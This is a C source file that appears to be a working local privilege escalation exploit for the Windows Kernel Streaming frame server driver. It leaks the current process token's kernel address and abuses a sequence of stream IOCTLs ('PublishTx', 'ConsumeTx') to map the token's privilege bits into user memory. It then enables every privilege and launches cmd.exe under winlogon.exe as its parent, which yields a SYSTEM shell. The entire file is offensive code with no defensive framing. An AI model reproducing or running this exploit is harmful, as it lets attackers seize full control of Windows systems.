#define __STREAMS__
#include "Types.h"
#include <ks.h>
#include <Dshow.h>
#include <ksproxy.h>

#pragma comment(lib, "Ksproxy.lib")
#pragma comment(lib, "ntdll.lib")

DEFINE_GUIDSTRUCT("3C0D501A-140B-11D1-B40F-00A0C9223196", KSNAME_Server);
#define KSNAME_Server DEFINE_GUIDNAMED(KSNAME_Server)

BOOL FSRegisterStream(HANDLE hDevice)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;
	HANDLE hEvent;
	InputBuffer inbuff = { 0 };

	uint32_t high = 0x14;
	uint32_t low = 0x0;

	hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
	if (hEvent == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] CreateEventW failed\n");
		return FALSE;
	}

	inbuff.Type = 2;
	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.qword18 = ((uint64_t)high << 32) | (uint64_t)low;
	inbuff.qword20 = 0x40000;
	inbuff.hEvent = hEvent;

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_RegisterStream, &inbuff, sizeof(InputBuffer), 0, 0);

	if (status == 0)
	{
		CloseHandle(hEvent);
		return TRUE;
	}
	else
	{
		wprintf(L"[!] FSRegisterStream failed with 0x%X\n", status);
		CloseHandle(hEvent);
		return FALSE;
	}
}

BOOL FSInitializeStream(HANDLE hDevice)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;
	HANDLE hEvent;
	InputBuffer inbuff = { 0 };

	uint32_t high = 0x14;
	uint32_t low = 0x0;

	hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
	if (hEvent == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] CreateEventW failed\n");
		return FALSE;
	}

	inbuff.Type = 1;
	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.qword18 = ((uint64_t)high << 32) | (uint64_t)low;
	inbuff.qword20 = 0x40000;
	inbuff.hEvent = hEvent;


	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_InitializeStream, &inbuff, sizeof(InputBuffer), 0, 0);

	if (status == 0)
	{
		CloseHandle(hEvent);
		return TRUE;
	}
	else
	{
		wprintf(L"[!] FSInitializeStream failed with 0x%X\n", status);
		CloseHandle(hEvent);
		return FALSE;
	}
}


BOOL FSInitializeContextRendezvous(HANDLE hDevice)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;
	DWORD dwbytesreturned = 0;
	
	MY_IRP inbuff = { 0 };

	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Type = 1;
	inbuff.Flags = 0x000000136FE7474D;

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_IniContextRendezv, &inbuff, sizeof(MY_IRP), NULL, NULL);

	if (status == NOERROR)
	{
		return TRUE;
	}
	else
	{
		wprintf(L"[!] FSInitializeContextRendezvous failed with 0x%X\n", status);
		return FALSE;
	}
}

BOOL FSRendezvousServerRegisterContext(HANDLE hDevice)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;
	DWORD dwbytesreturned = 0;
	HANDLE hEvent;

	hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
	if (hEvent == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] CreateEventW failed\n");
		return FALSE;
	}

	MY_IRP inbuff = { 0 };

	inbuff.Type = 2;
	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.hEvent = hEvent;

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_RegisterContext, &inbuff, sizeof(MY_IRP), NULL, NULL);

	if (status == NOERROR)
	{
		CloseHandle(hEvent);
		return TRUE;
	}
	else
	{
		wprintf(L"[!] FSRendezvousServerRegisterContext failed with 0x%X\n", status);
		CloseHandle(hEvent);
		return FALSE;
	}
}

uint64_t GetTokenAddress()
{
	NTSTATUS status;
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE currentToken = NULL;
	uint64_t tokenAddress = 0;
	ULONG ulBytes = 0;
	PSYSTEM_HANDLE_INFORMATION handleTableInfo = NULL;

	BOOL success = OpenProcessToken(currentProcess, TOKEN_QUERY, &currentToken);
	if (!success)
	{
		wprintf(L"[!] Couldn't open a handle to the current process token. (Error code: %d)\n", GetLastError());
		return 0;
	}
	// Allocate space in the heap for the handle table information which will be filled by the call to 'NtQuerySystemInformation' API
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (handleTableInfo != NULL)
		{
			handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
		}

		else
		{
			handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (status == 0)
	{
		// iterate over the system's handle table and look for the handles beloging to our process
		for (ULONG i = 0; i < handleTableInfo->NumberOfHandles; i++)
		{
			// if it finds our process and the handle matches the current token handle we already opened, print it
			if (handleTableInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() && handleTableInfo->Handles[i].HandleValue == (USHORT)currentToken)
			{
				tokenAddress = (uint64_t)handleTableInfo->Handles[i].Object;
				break;
			}
		}
	}
	else
	{
		if (handleTableInfo != NULL)
		{
			wprintf(L"[!] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
			HeapFree(GetProcessHeap(), 0, handleTableInfo);
			CloseHandle(currentToken);
			return 0;
		}
	}

	HeapFree(GetProcessHeap(), 0, handleTableInfo);
	CloseHandle(currentToken);

	return tokenAddress;
}

BOOL PublishTx(HANDLE hDevice, uint64_t TokenAddr)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;

	EvilBuffer inbuffer = { 0 };
	PublishTxOut outbuffer = { 0 };
	// There will be two pages mapped to user space one with RW and one with R
	// we could map the system TOKEN to the R only page and our process token to the RW page
	// then overwrite it with system token
	inbuffer.size = sizeof(EvilBuffer);
	inbuffer.value = ((uint64_t)0x1 << 32) | (uint64_t)0x3;
	inbuffer.value2 = 0x1;
	inbuffer.virtualAddress2 = TokenAddr; //RW
	inbuffer.size1 = ((uint64_t)0x1000 << 32) | (uint64_t)0x140;
	inbuffer.virtualAddress3 = TokenAddr; // R
	inbuffer.size2 = ((uint64_t)0x1000 << 32) | (uint64_t)0x140;
	inbuffer.flag = 0x10000000;			// Important value do not change it otherwise the page will be mapped as read only
	inbuffer.Priority = 0x00000004;     		// Important value do not change

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_PublishTx, &inbuffer, sizeof(EvilBuffer), &outbuffer, sizeof(PublishTxOut));

	if (status == NOERROR)
	{
		wprintf(L"[+] PublishTx stats[txsize:%I64d,rxsize:%I64d,txcount:%d,rxcount:%d]\n", 
			outbuffer.txsize,
			outbuffer.rxsize,
			outbuffer.txcount,
			outbuffer.rxcount);
		return TRUE;
	}
	else
	{
		wprintf(L"[!] PublishTx failed with 0x%X\n", status);
		return FALSE;
	}
}

BOOL ConsumeTx(HANDLE hDevice, uint8_t **Addr)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;

	ConsumeTxOut inbuffer = { 0 };

	// Allocate memory in user mode
	PVOID Inbuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (Inbuffer == NULL) {
		wprintf(L"[!] VirtualAlloc failed with 0x%X\n", GetLastError());
		return FALSE;
	}
	
	wprintf(L"[+] VirtualAlloc buffer => %p\n", Inbuffer);

	inbuffer.size = 0x1000;
	inbuffer.value = 0x6;

	memcpy(Inbuffer, &inbuffer, 0x30);

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_ConsumeTx, Inbuffer, sizeof(ConsumeTxOut), Inbuffer, sizeof(ConsumeTxOut));

	if (status == NOERROR)
	{
		memcpy(&inbuffer, Inbuffer, 0x68);
		wprintf(L"[+] ConsumeTx stats[txsize:%I64d,rxsize:%I64d,txcount:%d,rxcount:%d]\n",
			inbuffer.txsize,
			inbuffer.rxsize,
			inbuffer.txcount,
			inbuffer.rxcount);
		*Addr = inbuffer.PageVaAddressRW;
		return TRUE;
	}
	else
	{
		wprintf(L"[!] ConsumeTx failed with 0x%X\n", status);
		return FALSE;
	}
}

DWORD getProcessId(const wchar_t* process)
{
	HANDLE          hSnapShot;
	PROCESSENTRY32  pe32;
	DWORD           pid;


	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapShot == INVALID_HANDLE_VALUE)
	{
		printf("\n[-] Failed to create handle CreateToolhelp32Snapshot()\n\n");
		return -1;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapShot, &pe32) == FALSE)
	{
		printf("\n[-] Failed to call Process32First()\n\n");
		return -1;
	}

	do
	{
		if (_wcsicmp(pe32.szExeFile, process) == 0)
		{
			pid = pe32.th32ProcessID;
			return pid;
		}
	} while (Process32Next(hSnapShot, &pe32));

	CloseHandle(hSnapShot);
	return 0;
}


int spawnShell()
{
	const wchar_t* process = L"winlogon.exe";
	DWORD     pid;
	HANDLE    hProcess;
	HANDLE    hThread;
	LPVOID    ptrtomem;


	pid = getProcessId(process);

	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
	{
		wprintf(L"\n[-] Unable to open %ws process\n\n", process);
		return -1;
	}
	wprintf(L"\n[+] Opened %ws process pid=%d with PROCESS_ALL_ACCESS rights", process, pid);

	SIZE_T size;
	STARTUPINFOEXW siex = { 0 };
	siex.StartupInfo.cb = sizeof(siex);
	siex.lpAttributeList = NULL;
	
	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
	InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size);
	
	UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(hProcess), NULL, NULL);
	
	PROCESS_INFORMATION pi;
	WCHAR cmdPath[] = L"C:\\Windows\\System32\\cmd.exe";
	if (!CreateProcessW(NULL, cmdPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&siex, &pi)) {
		wprintf(L"[-] Failed to create new process.\n");
		wprintf(L"    |-> %d\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
		return FALSE;
	}
	
	wprintf(L"[+] New process is created successfully.\n");
	
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);

	return 0;
}


int main()
{
	uint64_t tokenAddress = 0;

	HANDLE DeviceH1, DeviceH2, DeviceH3;
	HRESULT hr;

	hr = KsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH1);

	if (hr != NOERROR) {
		wprintf(L"Error: %ld\n", hr);
		return 1;
	}

	hr = KsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH2);

	if (hr != NOERROR) {
		wprintf(L"Error: %ld\n", hr);
		return 1;
	}

	hr = KsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH3);

	if (hr != NOERROR) {
		wprintf(L"Error: %ld\n", hr);
		return 1;
	}

	wprintf(L"[+] Successfully got a handle 1 => %p\n", DeviceH1);
	wprintf(L"[+] Successfully got a handle 2 => %p\n", DeviceH2);
	wprintf(L"[+] Successfully got a handle 3 => %p\n", DeviceH3);

	tokenAddress = GetTokenAddress();

	uint64_t privaddr = tokenAddress + OFFSET_OF_TOKEN_PRIVILEGES;

	if (tokenAddress)
	{
		wprintf(L"[+] Target process TOKEN address: %llx\n", tokenAddress);
		wprintf(L"[+] Target process _SEP_TOKEN_PRIVILEGES address: %llx\n", privaddr);
	}

	BOOL success = FALSE;


	success = FSInitializeContextRendezvous(DeviceH1);

	if (success)
	{
		wprintf(L"[^] InitializeContextRendezvous successfully\n");
	}

	success = FSInitializeStream(DeviceH2);

	if (success)
	{
		wprintf(L"[^] FSInitializeStream successfully\n");
	}
	

	success = FSRegisterStream(DeviceH3);

	if (success)
	{
		wprintf(L"[^] FSRegisterStream successfully\n");
	}
	
	success = PublishTx(DeviceH3, privaddr);

	if (success)
	{
		wprintf(L"[^] PublishTx successfully\n");
	}
	
	uint8_t *mappedAddress = NULL;

	success = ConsumeTx(DeviceH3, &mappedAddress);

	if (success)
	{
		wprintf(L"[^] ConsumeTx successfully\n");
	}

	uint64_t address = (uint64_t)mappedAddress;
	uint64_t baseAlignment = 0x1000;

	// Align the address
	uint64_t alignedAddress = address & ~(baseAlignment - 1);

	wprintf(L"[+] Aligned VA Base Address => %p\n", (void*)alignedAddress);
	wprintf(L"[+] VA Token Address => %p\n", mappedAddress);

	if(mappedAddress != NULL)
	{
		// Enable all privileges
		memset(mappedAddress, 0xFF, 0x10);
		spawnShell();
	}

	CloseHandle(DeviceH1);
	CloseHandle(DeviceH2);
	CloseHandle(DeviceH3);

	return 0;
}
